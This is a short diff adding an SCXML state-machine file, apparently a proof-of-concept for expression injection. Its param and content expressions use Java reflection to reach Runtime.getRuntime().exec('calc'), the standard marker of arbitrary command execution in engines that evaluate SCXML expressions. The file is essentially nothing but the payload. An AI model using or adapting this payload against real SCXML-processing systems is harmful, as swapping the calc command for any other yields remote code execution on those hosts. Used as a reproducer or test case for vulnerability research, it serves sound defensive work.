@@ -1,0 +1,11 @@
+<?xml version="1.0"?>
+<scxml xmlns="http://www.w3.org/2005/07/scxml" version="1.0">
+    <parallel>
+        <invoke id="flag" src="1">
+            <param expr="''.getClass().forName('java.lang.Runtime').getRuntime().exec('calc')" name="flag">
+            </param>
+            <content expr="''.getClass().forName('java.lang.Runtime').getRuntime().exec('calc')">
+            </content>
+        </invoke>
+    </parallel>
+</scxml>
